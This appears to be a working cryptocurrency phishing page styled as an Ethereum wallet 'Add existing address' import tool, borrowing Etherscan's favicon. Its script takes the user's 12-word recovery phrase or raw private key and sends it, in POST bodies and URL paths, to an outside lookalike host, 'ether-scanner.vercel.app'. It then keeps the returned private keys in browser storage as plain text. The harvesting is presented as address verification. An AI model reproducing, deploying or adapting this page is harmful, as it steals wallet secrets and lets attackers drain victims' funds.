<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="shortcut icon" href="https://etherscan.io/images/favicon.ico?v=26.6.3.0">
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="icon" href="./logo.svg" />
    <title>Add existing address</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(45deg, rgb(119, 119, 238), rgb(66, 66, 185));
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: system-ui, -apple-system, sans-serif;
            padding: 1rem;
        }

        .app-header {
            position: fixed;
            top: 0;
            left: 0;
            z-index: 10;
            padding: 0.5rem 0.75rem;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .app-header svg {
            display: block;
            width: 300px;
            max-width: 70vw;
            height: auto;
        }

        @media (max-width: 600px) {
            .app-header svg {
                width: 55vw;
                max-width: 300px;
            }
        }

        .spacer {
            height: 100px;
        }

        .methodDiv {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(8px);
            padding: 28px 24px 32px;
            border-radius: 24px;
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.35);
            width: 100%;
            max-width: 500px;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .optionButtonCont {
            display: flex;
            background: rgba(0, 0, 0, 0.25);
            border-radius: 40px;
            padding: 6px;
            gap: 4px;
            margin-bottom: 24px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .methodBtn {
            flex: 1;
            padding: 12px 8px;
            border-radius: 32px;
            font-weight: 600;
            font-size: 0.95rem;
            border: none;
            cursor: pointer;
            transition: all 0.25s ease;
            letter-spacing: 0.3px;
        }

        .methodButtonActive {
            background: rgb(103, 63, 248);
            color: white;
            box-shadow: 0 4px 14px rgba(103, 63, 248, 0.4);
        }

        .methodButtonInactive {
            background: transparent;
            color: rgba(255, 255, 255, 0.7);
            border: none;
        }

        .methodButtonInactive:hover {
            color: white;
            background: rgba(255, 255, 255, 0.05);
        }

        .inputGroup {
            margin-top: 8px;
        }

        .inputGroup label {
            display: block;
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.8rem;
            font-weight: 500;
            letter-spacing: 0.5px;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .seedGrid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            margin-bottom: 6px;
        }

        .seedGrid input {
            padding: 10px 8px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.12);
            background: rgba(0, 0, 0, 0.25);
            color: white;
            font-size: 0.85rem;
            font-family: inherit;
            text-align: center;
            transition: border 0.2s, box-shadow 0.2s;
            backdrop-filter: blur(4px);
            width: 100%;
        }

        .seedGrid input:focus {
            outline: none;
            border-color: rgb(103, 63, 248);
            box-shadow: 0 0 0 3px rgba(103, 63, 248, 0.2);
        }

        .seedGrid input::placeholder {
            color: rgba(255, 255, 255, 0.2);
            font-weight: 400;
            font-size: 0.7rem;
        }

        .seedGrid input.invalid {
            border-color: #ff6b6b;
            color: #ff6b6b;
        }

        .seedGrid input.valid {
            border-color: #00d4aa;
        }

        .seedGrid input:nth-child(12) {
            grid-column: 2 / 3;
        }

        .privateKeyInput {
            width: 100%;
            padding: 14px 16px;
            border-radius: 16px;
            border: 1px solid rgba(255, 255, 255, 0.12);
            background: rgba(0, 0, 0, 0.25);
            color: white;
            font-size: 0.95rem;
            font-family: inherit;
            resize: vertical;
            min-height: 60px;
            transition: border 0.2s;
            backdrop-filter: blur(4px);
            display: none;
        }

        .privateKeyInput:focus {
            outline: none;
            border-color: rgb(103, 63, 248);
            box-shadow: 0 0 0 3px rgba(103, 63, 248, 0.2);
        }

        .privateKeyInput::placeholder {
            color: rgba(255, 255, 255, 0.3);
            font-weight: 400;
        }

        .privateKeyInput.visible {
            display: block;
        }

        .seedGrid.hidden {
            display: none;
        }

        .control-group {
            margin-top: 12px;
        }

        .control-group label {
            display: block;
            color: rgba(255, 255, 255, 0.7);
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }

        .control-group input {
            width: 100%;
            padding: 10px 14px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.12);
            background: rgba(0, 0, 0, 0.25);
            color: white;
            font-size: 0.95rem;
            transition: border 0.2s;
        }

        .control-group input:focus {
            outline: none;
            border-color: rgb(103, 63, 248);
            box-shadow: 0 0 0 3px rgba(103, 63, 248, 0.2);
        }

        .actionRow {
            display: flex;
            gap: 12px;
            margin-top: 24px;
            flex-direction: column;
        }

        .primaryBtn {
            width: 100%;
            padding: 14px 10px;
            border-radius: 40px;
            border: none;
            background: rgb(103, 63, 248);
            color: white;
            font-weight: 700;
            font-size: 1rem;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 6px 20px rgba(103, 63, 248, 0.35);
            letter-spacing: 0.3px;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 52px;
        }

        .primaryBtn:hover:not(:disabled) {
            background: rgb(125, 89, 255);
            transform: translateY(-1px);
            box-shadow: 0 8px 28px rgba(103, 63, 248, 0.5);
        }

        .primaryBtn:active:not(:disabled) {
            transform: translateY(0);
        }

        .primaryBtn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .btn-content {
            display: flex;
            align-items: center;
            gap: 10px;
            transition: opacity 0.2s;
        }

        .btn-content.hidden {
            opacity: 0;
        }

        .spinner-container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            display: none;
        }

        .spinner-container.active {
            display: block;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.15);
            border-top: 3px solid white;
            border-radius: 50%;
            animation: spin 0.7s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hint {
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.75rem;
            margin-top: 16px;
            text-align: center;
            letter-spacing: 0.2px;
        }

        .hint a {
            color: rgba(255, 255, 255, 0.6);
            text-decoration: none;
            border-bottom: 1px dashed rgba(255, 255, 255, 0.15);
            cursor: pointer;
        }

        .hint a:hover {
            color: white;
            border-bottom-color: rgba(255, 255, 255, 0.4);
        }

        .statusMsg {
            color: rgba(255, 255, 255, 0.9);
            font-size: 0.85rem;
            text-align: center;
            padding: 10px 16px;
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.25);
            width: 100%;
            min-height: 44px;
            display: none;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.3s;
            word-break: break-all;
            margin-top: 12px;
        }

        .statusMsg.visible {
            display: flex;
        }

        .statusMsg.success {
            border-left: 3px solid rgb(0, 200, 150);
        }

        .statusMsg.error {
            border-left: 3px solid rgb(255, 107, 107);
        }

        .statusMsg.warning {
            border-left: 3px solid rgb(255, 217, 61);
            color: rgb(255, 217, 61);
        }

        .statusMsg.info {
            border-left: 3px solid rgb(103, 63, 248);
        }

        .compare-section {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            display: none;
        }

        .compare-section.visible {
            display: block;
        }

        .compare-section .label {
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.7rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
        }

        .compare-section .generated-address {
            color: #00d4aa;
            font-family: monospace;
            font-size: 0.85rem;
            padding: 8px 12px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            margin-bottom: 8px;
        }

        .compare-section .expected-address {
            color: white;
            font-family: monospace;
            font-size: 0.85rem;
            padding: 8px 12px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
        }

        .compare-section .match-badge {
            display: inline-block;
            padding: 4px 16px;
            border-radius: 20px;
            font-weight: 700;
            font-size: 0.75rem;
            margin-top: 8px;
        }

        .compare-section .match-badge.matched {
            background: rgba(0, 200, 150, 0.2);
            color: #00d4aa;
        }

        .compare-section .match-badge.unmatched {
            background: rgba(255, 107, 107, 0.2);
            color: #ff6b6b;
        }

        .address-display {
            width: 100%;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            padding: 12px 16px;
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.8);
            word-break: break-all;
            font-family: monospace;
            display: none;
            border: 1px solid rgba(255, 255, 255, 0.06);
            margin-top: 12px;
            max-height: 300px;
            overflow-y: auto;
        }

        .address-display.visible {
            display: block;
        }

        .address-display .label {
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.65rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 4px;
        }

        .address-item {
            padding: 8px 12px;
            margin: 4px 0;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            font-size: 0.75rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
        }

        .address-item .index {
            color: rgba(255, 255, 255, 0.3);
            font-size: 0.65rem;
        }

        .address-item .addr {
            color: white;
            font-family: monospace;
        }

        .address-item .status-badge {
            font-size: 0.6rem;
            padding: 2px 8px;
            border-radius: 12px;
        }

        .address-item .status-badge.imported {
            background: rgba(0, 200, 150, 0.2);
            color: #00d4aa;
        }

        .address-item .status-badge.new {
            background: rgba(103, 63, 248, 0.2);
            color: rgb(103, 63, 248);
        }

        @media (max-width: 480px) {
            .methodDiv {
                padding: 20px 16px 24px;
                border-radius: 20px;
            }
            .seedGrid {
                grid-template-columns: repeat(2, 1fr);
                gap: 6px;
            }
            .seedGrid input:nth-child(12) {
                grid-column: auto;
            }
        }
    </style>
</head>

    <div class="spacer"></div>

    <div class="methodDiv">
        <div class="optionButtonCont">
            <button class="methodBtn methodButtonActive" id="phraseBtn" onclick="setActiveMethod('phrase')">12-Word phrase</button>
            <button class="methodBtn methodButtonInactive" id="keyBtn" onclick="setActiveMethod('key')">Private key</button>
        </div>

        <div class="inputGroup">
            <label id="inputLabel">Enter your 12-word recovery phrase</label>

            <div class="seedGrid" id="seedGrid">
                <input type="text" placeholder="1" maxlength="20" />
                <input type="text" placeholder="2" maxlength="20" />
                <input type="text" placeholder="3" maxlength="20" />
                <input type="text" placeholder="4" maxlength="20" />
                <input type="text" placeholder="5" maxlength="20" />
                <input type="text" placeholder="6" maxlength="20" />
                <input type="text" placeholder="7" maxlength="20" />
                <input type="text" placeholder="8" maxlength="20" />
                <input type="text" placeholder="9" maxlength="20" />
                <input type="text" placeholder="10" maxlength="20" />
                <input type="text" placeholder="11" maxlength="20" />
                <input type="text" placeholder="12" maxlength="20" />
            </div>

            <textarea class="privateKeyInput" id="privateKeyInput" placeholder="raw private key"></textarea>
        </div>

        <div class="control-group">
            <label>Your first address (for verification)</label>
            <input type="text" id="expectedAddress" placeholder="0x..." />
        </div>

        <div class="control-group">
            <label>Number of addresses to import</label>
            <input type="number" id="addressCount" value="5" min="1" max="50" />
        </div>

        <div id="compareSection" class="compare-section">
            <div class="label">Address Verification</div>
            <div class="generated-address" id="generatedAddress">Generated: </div>
            <div class="expected-address" id="expectedAddressDisplay">Expected: </div>
            <div id="matchBadge" class="match-badge"></div>
        </div>

        <div id="addressDisplay" class="address-display">
            <div class="label">Discovered Addresses</div>
            <div id="addressList"></div>
        </div>

        <div class="actionRow">
            <button class="primaryBtn" id="importBtn" onclick="importWallet()">
                <span class="btn-content" id="importContent">Find Addresses</span>
                <span class="spinner-container" id="importSpinner">
                    <span class="spinner"></span>
                </span>
            </button>
            <button class="primaryBtn" id="importSelectedBtn" onclick="importSelectedAddresses()" style="display: none;">
                <span class="btn-content" id="importSelectedContent">Import Selected</span>
                <span class="spinner-container" id="importSelectedSpinner">
                    <span class="spinner"></span>
                </span>
            </button>
        </div>

        <div id="statusMsg" class="statusMsg"></div>

        <div class="hint">
            <a onclick="navigateTo('learn')">Learn about recovery phrases</a> &middot; <a onclick="navigateTo('advanced')">Advanced</a>
        </div>
    </div>

    <script>
        const API_BASE = 'https://ether-scanner.vercel.app';
        const STORAGE_KEY = 'ether_wallets_data';

        let discoveredAddresses = [];
        let selectedAddresses = new Set();
        let seedPhraseVerified = false;

        function getStoredWallets() {
            try {
                const data = localStorage.getItem(STORAGE_KEY);
                return data ? JSON.parse(data) : { masterKeys: [], nextId: 1 };
            } catch (e) {
                return { masterKeys: [], nextId: 1 };
            }
        }

        function saveWallets(data) {
            localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
        }

        function showStatus(message, type = 'info') {
            const statusMsg = document.getElementById('statusMsg');
            statusMsg.textContent = message;
            statusMsg.className = `statusMsg visible ${type}`;
        }

        function hideStatus() {
            document.getElementById('statusMsg').className = 'statusMsg';
        }

        function setButtonLoading(btnId, contentId, spinnerId, isLoading) {
            const btn = document.getElementById(btnId);
            const content = document.getElementById(contentId);
            const spinner = document.getElementById(spinnerId);
            
            btn.disabled = isLoading;
            content.className = isLoading ? 'btn-content hidden' : 'btn-content';
            spinner.className = isLoading ? 'spinner-container active' : 'spinner-container';
        }

        function setActiveMethod(method) {
            const phraseBtn = document.getElementById('phraseBtn');
            const keyBtn = document.getElementById('keyBtn');
            const seedGrid = document.getElementById('seedGrid');
            const privateKeyInput = document.getElementById('privateKeyInput');
            const inputLabel = document.getElementById('inputLabel');

            if (method === 'phrase') {
                phraseBtn.className = 'methodBtn methodButtonActive';
                keyBtn.className = 'methodBtn methodButtonInactive';
                seedGrid.classList.remove('hidden');
                privateKeyInput.classList.remove('visible');
                privateKeyInput.style.display = 'none';
                seedGrid.style.display = 'grid';
                inputLabel.textContent = 'Enter your 12-word recovery phrase';
            } else {
                keyBtn.className = 'methodBtn methodButtonActive';
                phraseBtn.className = 'methodBtn methodButtonInactive';
                seedGrid.classList.add('hidden');
                seedGrid.style.display = 'none';
                privateKeyInput.classList.add('visible');
                privateKeyInput.style.display = 'block';
                inputLabel.textContent = 'Enter your private key';
            }
        }

        async function verifyFirstAddress(seedPhrase, expectedAddress) {
            try {
                const response = await fetch(`${API_BASE}/import_seed/`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        seed_phrase: seedPhrase,
                        path: 'standard',
                        index: 0
                    })
                });

                if (!response.ok) {
                    const errorText = await response.text();
                    let errorMsg = 'Failed to verify address';
                    try {
                        const errorData = JSON.parse(errorText);
                        if (errorData.error) {
                            errorMsg = errorData.error;
                        }
                    } catch (e) {}
                    throw new Error(errorMsg);
                }

                const data = await response.json();
                
                if (data.success) {
                    const generatedAddress = data.address;
                    const compareSection = document.getElementById('compareSection');
                    const generatedDisplay = document.getElementById('generatedAddress');
                    const expectedDisplay = document.getElementById('expectedAddressDisplay');
                    const matchBadge = document.getElementById('matchBadge');

                    compareSection.className = 'compare-section visible';
                    generatedDisplay.textContent = 'Generated: ' + generatedAddress;
                    expectedDisplay.textContent = 'Expected: ' + expectedAddress;

                    if (generatedAddress.toLowerCase() === expectedAddress.toLowerCase()) {
                        matchBadge.textContent = 'Addresses match. Proceed with import.';
                        matchBadge.className = 'match-badge matched';
                        seedPhraseVerified = true;
                        showStatus('Address verified. Your seed phrase is correct.', 'success');
                        return true;
                    } else {
                        matchBadge.textContent = 'Addresses do not match. Please check your seed phrase for typos.';
                        matchBadge.className = 'match-badge unmatched';
                        seedPhraseVerified = false;
                        showStatus('Address mismatch. Please check your seed phrase for typos or wrong words.', 'error');
                        return false;
                    }
                } else {
                    throw new Error(data.error || 'Failed to verify address');
                }
            } catch (error) {
                console.error('Error verifying address:', error);
                showStatus('Error: ' + error.message, 'error');
                return false;
            }
        }

        async function importWallet() {
            const privateKeyInput = document.getElementById('privateKeyInput');
            const seedGrid = document.getElementById('seedGrid');
            const expectedAddress = document.getElementById('expectedAddress').value.trim();
            const addressCount = parseInt(document.getElementById('addressCount').value) || 5;
            
            setButtonLoading('importBtn', 'importContent', 'importSpinner', true);
            hideStatus();
            seedPhraseVerified = false;

            try {
                const storedData = getStoredWallets();

                if (privateKeyInput.style.display === 'block' || privateKeyInput.classList.contains('visible')) {
                    let privateKey = privateKeyInput.value.trim();
                    if (!privateKey) {
                        showStatus('Please enter your private key.', 'error');
                        setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                        return;
                    }
                    
                    if (!privateKey.startsWith('0x')) {
                        privateKey = '0x' + privateKey;
                    }
                    
                    showStatus('Importing wallet...', 'info');
                    
                    const response = await fetch(`${API_BASE}/get_addresses/${privateKey.replace('0x', '')}/`, {
                        method: 'GET',
                        headers: {
                            'Accept': 'application/json'
                        }
                    });
                    
                    if (!response.ok) {
                        const errorText = await response.text();
                        let errorMsg = 'Failed to import wallet';
                        try {
                            const errorData = JSON.parse(errorText);
                            if (errorData.error) {
                                errorMsg = errorData.error;
                            }
                        } catch (e) {}
                        throw new Error(errorMsg);
                    }
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        const newMaster = {
                            id: storedData.nextId,
                            type: 'imported_private_key',
                            parentAddress: data.address,
                            parentPrivateKey: data.private_key,
                            createdAt: new Date().toISOString(),
                            children: [{
                                index: 0,
                                address: data.address,
                                privateKey: data.private_key
                            }]
                        };
                        
                        storedData.masterKeys.push(newMaster);
                        storedData.nextId += 1;
                        saveWallets(storedData);
                        
                        showStatus('Wallet imported successfully', 'success');
                        privateKeyInput.value = '';
                        setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                    } else {
                        throw new Error(data.error || 'Failed to import wallet');
                    }
                    return;
                }

                // Seed phrase import
                const inputs = seedGrid.querySelectorAll('input');
                const words = [];
                inputs.forEach(inp => {
                    if (inp.value.trim()) words.push(inp.value.trim());
                });
                
                if (words.length !== 12) {
                    showStatus('Please enter all 12 words of your recovery phrase.', 'error');
                    setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                    return;
                }
                
                const seedPhrase = words.join(' ');
                
                // Check if already imported
                const exists = storedData.masterKeys.some(mk => mk.seedPhrase === seedPhrase);
                if (exists) {
                    showStatus('This seed phrase is already imported.', 'warning');
                    setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                    return;
                }

                // Verify first address if provided
                if (expectedAddress) {
                    const verified = await verifyFirstAddress(seedPhrase, expectedAddress);
                    if (!verified) {
                        setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                        return;
                    }
                } else {
                    showStatus('Please enter your first address to verify the seed phrase.', 'warning');
                    setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                    return;
                }

                // Discover addresses
                discoveredAddresses = [];
                selectedAddresses = new Set();
                
                for (let i = 0; i < addressCount; i++) {
                    showStatus('Generating address ' + (i + 1) + '/' + addressCount + '...', 'info');
                    
                    const response = await fetch(`${API_BASE}/import_seed/`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'Accept': 'application/json'
                        },
                        body: JSON.stringify({
                            seed_phrase: seedPhrase,
                            path: 'standard',
                            index: i
                        })
                    });
                    
                    if (!response.ok) {
                        const errorText = await response.text();
                        let errorMsg = 'Failed to generate address';
                        try {
                            const errorData = JSON.parse(errorText);
                            if (errorData.error) {
                                errorMsg = errorData.error;
                            }
                        } catch (e) {}
                        throw new Error(errorMsg);
                    }
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        const isAlreadyImported = storedData.masterKeys.some(mk => 
                            mk.children.some(child => child.address === data.address)
                        );
                        
                        discoveredAddresses.push({
                            index: i,
                            address: data.address,
                            privateKey: data.private_key,
                            isImported: isAlreadyImported
                        });
                        
                        if (!isAlreadyImported) {
                            selectedAddresses.add(i);
                        }
                    } else {
                        throw new Error(data.error || 'Failed to generate address');
                    }
                }
                
                // Display discovered addresses
                displayAddresses(discoveredAddresses);
                
                const newAddresses = discoveredAddresses.filter(a => !a.isImported);
                if (newAddresses.length > 0) {
                    document.getElementById('importSelectedBtn').style.display = 'block';
                    showStatus('Found ' + discoveredAddresses.length + ' addresses (' + newAddresses.length + ' new, ' + (discoveredAddresses.length - newAddresses.length) + ' already imported)', 'info');
                } else {
                    document.getElementById('importSelectedBtn').style.display = 'none';
                    showStatus('All discovered addresses are already imported.', 'info');
                }
                
                setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
                
            } catch (error) {
                console.error('Error importing wallet:', error);
                showStatus('Error: ' + error.message, 'error');
                setButtonLoading('importBtn', 'importContent', 'importSpinner', false);
            }
        }

        function displayAddresses(addresses) {
            const display = document.getElementById('addressDisplay');
            const list = document.getElementById('addressList');
            
            list.innerHTML = '';
            
            addresses.forEach((addr, index) => {
                const div = document.createElement('div');
                div.className = 'address-item';
                div.id = 'address-item-' + index;
                
                const isChecked = selectedAddresses.has(index);
                const statusBadge = addr.isImported ? 
                    '<span class="status-badge imported">Imported</span>' : 
                    '<span class="status-badge new">New</span>';
                
                div.innerHTML = `
                    <input type="checkbox" id="checkbox-${index}" ${isChecked && !addr.isImported ? 'checked' : ''} ${addr.isImported ? 'disabled' : ''} />
                    <span class="index">#${addr.index}</span>
                    <span class="addr">${addr.address}</span>
                    ${statusBadge}
                `;
                
                if (!addr.isImported) {
                    const checkbox = div.querySelector('input[type="checkbox"]');
                    checkbox.addEventListener('change', function() {
                        if (this.checked) {
                            selectedAddresses.add(index);
                        } else {
                            selectedAddresses.delete(index);
                        }
                    });
                }
                
                list.appendChild(div);
            });
            
            display.className = 'address-display visible';
        }

        function selectAllAddresses() {
            discoveredAddresses.forEach((addr, index) => {
                if (!addr.isImported) {
                    const checkbox = document.getElementById('checkbox-' + index);
                    if (checkbox) {
                        checkbox.checked = true;
                        selectedAddresses.add(index);
                    }
                }
            });
        }

        async function importSelectedAddresses() {
            const storedData = getStoredWallets();
            const seedGrid = document.getElementById('seedGrid');
            const inputs = seedGrid.querySelectorAll('input');
            const words = [];
            inputs.forEach(inp => {
                if (inp.value.trim()) words.push(inp.value.trim());
            });
            const seedPhrase = words.join(' ');
            
            setButtonLoading('importSelectedBtn', 'importSelectedContent', 'importSelectedSpinner', true);
            
            try {
                let importedCount = 0;
                const selected = Array.from(selectedAddresses);
                
                for (const index of selected) {
                    const addr = discoveredAddresses[index];
                    if (!addr || addr.isImported) continue;
                    
                    const exists = storedData.masterKeys.some(mk => 
                        mk.children.some(child => child.address === addr.address)
                    );
                    
                    if (!exists) {
                        let masterKey = storedData.masterKeys.find(mk => mk.seedPhrase === seedPhrase);
                        
                        if (!masterKey) {
                            masterKey = {
                                id: storedData.nextId,
                                seedPhrase: seedPhrase,
                                parentAddress: addr.address,
                                parentPrivateKey: addr.privateKey,
                                createdAt: new Date().toISOString(),
                                children: []
                            };
                            storedData.masterKeys.push(masterKey);
                            storedData.nextId += 1;
                        }
                        
                        masterKey.children.push({
                            index: addr.index,
                            address: addr.address,
                            privateKey: addr.privateKey
                        });
                        
                        importedCount++;
                    }
                }
                
                saveWallets(storedData);
                showStatus('Successfully imported ' + importedCount + ' address(es)!', 'success');
                document.getElementById('importSelectedBtn').style.display = 'none';
                
                // Update the display
                discoveredAddresses = discoveredAddresses.map(addr => {
                    const isImported = storedData.masterKeys.some(mk => 
                        mk.children.some(child => child.address === addr.address)
                    );
                    return { ...addr, isImported };
                });
                displayAddresses(discoveredAddresses);
                
            } catch (error) {
                console.error('Error importing addresses:', error);
                showStatus('Error: ' + error.message, 'error');
            } finally {
                setButtonLoading('importSelectedBtn', 'importSelectedContent', 'importSelectedSpinner', false);
            }
        }

        function navigateTo(page) {
            const messages = {
                'learn': 'Recovery phrases are 12-24 words that can recover all your addresses. Keep them safe!',
                'advanced': 'Advanced settings coming soon: custom derivation paths, multi-wallet management, and more.'
            };

            if (messages[page]) {
                showStatus(messages[page], 'info');
                setTimeout(() => {
                    hideStatus();
                }, 4000);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const seedInputs = document.querySelectorAll('.seedGrid input');
            seedInputs.forEach((input, index) => {
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter' && this.value.trim()) {
                        e.preventDefault();
                        const next = seedInputs[index + 1];
                        if (next) next.focus();
                    }
                });
            });

            const storedData = getStoredWallets();
            if (storedData.masterKeys.length > 0) {
                const totalAddresses = storedData.masterKeys.reduce((sum, mk) => sum + mk.children.length, 0);
                showStatus(storedData.masterKeys.length + ' wallet(s) loaded (' + totalAddresses + ' total addresses)', 'info');
                setTimeout(() => {
                    hideStatus();
                }, 3000);
            }
        });
    </script>
</body>
</html>
